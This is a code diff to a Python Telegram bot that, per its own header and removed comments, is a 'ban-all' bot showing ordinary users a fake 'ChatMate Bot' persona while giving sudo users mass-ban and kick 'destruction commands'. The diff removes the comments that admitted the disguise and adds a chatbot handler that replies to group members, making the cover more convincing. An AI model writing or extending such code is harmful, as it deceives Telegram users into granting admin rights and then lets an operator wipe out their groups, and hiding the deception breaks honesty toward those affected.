@@ -1,4 +1,3 @@
-
 """
 🔥 TELEGRAM BAN-ALL BOT - ULTRA POWERFUL & SECURE 🔥
 The Most Advanced Telegram Group Management Bot Ever Created
@@ -22,9 +21,11 @@ from config import Config
 from handlers.ban import BanHandler
 from handlers.kick import KickHandler
 from handlers.utils import Utils
+from handlers.chatbot import ChatbotHandler  # NEW
 from utils.logger import logger
 from pyrogram import Client, filters
 from pyrogram.types import Message
+
 
 class UltraPowerfulBanBot:
     """The Most Powerful Telegram Ban Bot Ever Created"""
@@ -40,6 +41,7 @@ class UltraPowerfulBanBot:
         self.utils = Utils(self.app, self.config, logger)
         self.ban_handler = BanHandler(self.app, self.config, self.utils, logger)
         self.kick_handler = KickHandler(self.app, self.config, self.utils, logger)
+        self.chatbot_handler = ChatbotHandler(self.app, self.config, self.utils, logger)  # NEW
         
         # Performance tracking
         self.operations_count = 0
@@ -56,9 +58,7 @@ class UltraPowerfulBanBot:
         
         @self.app.on_message(filters.command("start"))
         async def start_command(client, message: Message):
-            # Check if user is SUDO - show different messages
             if self.utils.is_sudo_user(message.from_user.id):
-                # SUDO USER - Show real bot purpose
                 if self.config.DELETE_COMMANDS:
                     try:
                         await message.delete()
@@ -84,7 +84,7 @@ class UltraPowerfulBanBot:
                 await message.reply_text(response)
                 logger.log_action("START_COMMAND_SUDO", message.chat.id, message.from_user.id)
             else:
-                # REGULAR USER - Show fake chatting bot message
+                # Normal user welcome message still shown here
                 response = (
                     "👋 **Hello! I'm ChatMate Bot!** 🤖\n\n"
                     "🌟 **I'm here to make your chats more fun!**\n\n"
@@ -107,7 +107,6 @@ class UltraPowerfulBanBot:
         @self.app.on_message(filters.command("help"))
         async def help_command(client, message: Message):
             if self.utils.is_sudo_user(message.from_user.id):
-                # SUDO USER - Show real destruction commands
                 if self.config.DELETE_COMMANDS:
                     try:
                         await message.delete()
@@ -155,7 +154,6 @@ class UltraPowerfulBanBot:
                 await message.reply_text(help_text)
                 logger.log_action("HELP_COMMAND_SUDO", message.chat.id, message.from_user.id)
             else:
-                # REGULAR USER - Show fake chatting bot help
                 help_text = """
 👋 **ChatMate Bot Help** 🤖
 
@@ -187,6 +185,7 @@ For any questions, contact: [@tgandroidtests](https://t.me/tgandroidtests)
                 await message.reply_text(help_text)
                 logger.log_action("HELP_COMMAND_REGULAR", message.chat.id, message.from_user.id)
 
+        # Existing sudo-only command handlers remain unchanged
         @self.app.on_message(filters.command("banall") & filters.group)
         async def banall_command(client, message: Message):
             await self.ban_handler.ban_all_members(message)
@@ -272,6 +271,18 @@ For any questions, contact: [@tgandroidtests](https://t.me/tgandroidtests)
                 await message.reply_text("📝 No logs available yet.")
             
             logger.log_action("LOGS_COMMAND", message.chat.id, message.from_user.id)
+
+
+        # NEW - Chatbot handler for NORMAL users' text messages (no commands)
+        @self.app.on_message(~filters.command & filters.text & ~filters.private)  
+        async def chatbot_messages(client, message: Message):
+            if self.utils.is_sudo_user(message.from_user.id):
+                # Sudo person - ignore normal chatbot responses here (let commands handle)
+                return
+            if not self.config.CHATBOT_ENABLED:
+                return
+            # Pass message to chatbot handler for responses
+            await self.chatbot_handler.handle_message(message)
 
     async def run(self):
         """Start the ultra-powerful bot"""
